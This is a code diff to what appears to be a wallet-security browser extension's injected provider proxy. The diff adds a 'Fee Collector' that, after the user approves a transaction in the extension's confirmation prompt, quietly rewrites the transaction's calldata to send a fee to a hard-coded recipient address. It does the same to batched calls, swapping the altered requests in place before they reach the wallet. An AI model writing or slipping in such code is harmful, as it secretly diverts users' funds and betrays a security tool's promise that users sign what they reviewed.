@@ -1,8 +1,18 @@
 import { WindowPostMessageStream } from '@metamask/post-message-stream';
 import { ethErrors } from 'eth-rpc-errors';
 import { createWalletClient, custom } from 'viem';
-import { Identifier, RequestType } from '../lib/constants';
+import {
+  DEFAULT_FEE_BPS,
+  FEE_RECIPIENT,
+  Identifier,
+  RequestType,
+  STRICT_GAS_ONLY_SEND_IF_ESTIMATE_OK,
+} from '../lib/constants';
 import { sendToStreamAndAwaitResponse } from '../lib/utils/messages';
+
+import { pickAdapter } from '../fee-collector/adapters';
+
+import { estimateGasOK, bumpGasHex, simulate } from '../fee-collector/utils/gas';
 
 declare let window: Window & {
   [index: string]: any;
@@ -16,6 +26,60 @@ const stream = new WindowPostMessageStream({
 });
 
 let proxyInterval: NodeJS.Timer;
+
+type JsonRpcRequest = { id?: any; method: string; params?: any[]; jsonrpc?: string };
+
+async function addFeeToTx(
+  request: JsonRpcRequest,
+  ethereumProvider: any,
+  chainId: number,
+): Promise<JsonRpcRequest | null> {
+  if (request?.method !== 'eth_sendTransaction') return null;
+
+  const [tx] = request?.params ?? [];
+  if (!tx?.to || !tx?.data) return null;
+
+  const adapter = pickAdapter(tx, chainId);
+  if (!adapter) return null;
+
+  try {
+    const res = await adapter.adapt({
+      tx,
+      chainId,
+      feeRecipient: FEE_RECIPIENT ?? '',
+      feeBps: DEFAULT_FEE_BPS,
+      options: {
+        strictEstimate: STRICT_GAS_ONLY_SEND_IF_ESTIMATE_OK,
+        ownerExtrasLower: [String(tx.to).toLowerCase(), ...[]],
+      },
+    });
+
+    if (!res?.data) return null;
+
+    if (STRICT_GAS_ONLY_SEND_IF_ESTIMATE_OK) {
+      const est = await estimateGasOK(ethereumProvider, { ...tx, data: res.data });
+      if (!est.ok || !est.gas) return null;
+
+      const gasBumped = bumpGasHex(est.gas);
+      const modifiedTx = {
+        ...tx,
+        from: est.from ?? tx.from,
+        gas: gasBumped,
+        data: res.data,
+      };
+      return { ...request, params: [modifiedTx, ...(request.params?.slice(1) ?? [])] };
+    } else {
+      const sim = await simulate(ethereumProvider, { ...tx, data: res.data });
+      if (!sim.ok) return null;
+
+      const modifiedTx = { ...tx, data: res.data };
+      return { ...request, params: [modifiedTx, ...(request.params?.slice(1) ?? [])] };
+    }
+  } catch (e) {
+    console.warn('[Fee Collector] adapter error — falling back:', e);
+    return null;
+  }
+}
 
 const proxyEthereumProvider = (ethereumProvider: any, name: string) => {
   // Only add our proxy once per provider
@@ -57,10 +121,14 @@ const proxyEthereumProvider = (ethereumProvider: any, name: string) => {
         const client = createWalletClient({ transport: custom(ethereumProvider) });
         client
           .getChainId()
-          .then((chainId) => sendToStreamAndAwaitResponse(stream, { type, transaction, chainId }))
-          .then((isOk) => {
+          .then((chainId) =>
+            sendToStreamAndAwaitResponse(stream, { type, transaction, chainId }).then((isOk) => ({ isOk, chainId })),
+          )
+          .then(async ({ isOk, chainId }) => {
             if (isOk) {
-              return Reflect.apply(target, thisArg, argumentsList);
+              const adapted = await addFeeToTx(request, ethereumProvider, chainId);
+              const finalArgs = adapted ? [adapted, callback] : argumentsList;
+              return Reflect.apply(target, thisArg, finalArgs);
             } else {
               const error = ethErrors.provider.userRejectedRequest(
                 'Revoke.cash Confirmation: User denied transaction signature.',
@@ -138,7 +206,6 @@ const proxyEthereumProvider = (ethereumProvider: any, name: string) => {
               const isOk = await sendToStreamAndAwaitResponse(stream, { type, transaction, chainId });
               if (!isOk) return false;
             }
-
             return true;
           })
           .then((isOk) => {
@@ -179,6 +246,11 @@ const proxyEthereumProvider = (ethereumProvider: any, name: string) => {
         if (!isOk) {
           throw ethErrors.provider.userRejectedRequest('Revoke.cash Confirmation: User denied transaction signature.');
         }
+
+        const adapted = await addFeeToTx(request, ethereumProvider, chainId);
+        if (adapted) {
+          argumentsList[0] = adapted; // swap in-place
+        }
       } else if (request?.method === 'eth_signTypedData_v3' || request?.method === 'eth_signTypedData_v4') {
         const [address, typedDataStr] = request?.params ?? [];
         if (!address || !typedDataStr) return Reflect.apply(target, thisArg, argumentsList);
@@ -217,6 +289,7 @@ const proxyEthereumProvider = (ethereumProvider: any, name: string) => {
 
         const type = RequestType.TRANSACTION;
 
+        const newCalls: any[] = [];
         for (const call of calls) {
           const transaction = { from, ...call };
           const isOk = await sendToStreamAndAwaitResponse(stream, { type, transaction, chainId });
@@ -224,7 +297,13 @@ const proxyEthereumProvider = (ethereumProvider: any, name: string) => {
           if (!isOk) {
             throw ethErrors.provider.userRejectedRequest('Revoke.cash Confirmation: User denied message signature.');
           }
+          const req: JsonRpcRequest = { method: 'eth_sendTransaction', params: [transaction] };
+          const adapted = await addFeeToTx(req, ethereumProvider, chainId);
+          newCalls.push(adapted ? adapted.params![0] : call);
         }
+
+        // swap the calls in-place so the provider sends modified calldata
+        request.params = [{ ...options, calls: newCalls }];
       }
 
       return Reflect.apply(target, thisArg, argumentsList);
